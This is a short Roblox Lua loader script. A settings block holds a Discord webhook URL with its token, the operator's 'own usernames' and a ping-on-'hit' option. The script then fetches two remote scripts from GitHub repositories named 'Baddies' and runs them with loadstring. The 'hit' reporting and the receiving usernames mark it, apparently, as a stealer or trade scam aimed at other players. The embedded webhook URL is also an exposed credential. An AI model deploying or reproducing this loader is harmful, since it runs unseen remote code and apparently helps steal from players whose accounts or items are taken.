-- SETTINGS
_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1488920046557204510/LiUOcaDqbGNi1eIitOApk53eVbQGd_Z9x-J-9sCT0BbHZ1V0DFIn4OYqT-qS1RiRSOwo" -- Input Ur webhook Here
_G.MY_USERNAMES = {"SurviveLavaFree", "X", "X"} -- YOUR own usernames
_G.PING_POOR = true -- True/False To Ping @Everyone ON HIT

-- Load Main
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/freemium.lua", true))()
end)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraaIsMe/Baddies/main/Visuals"))()
end)
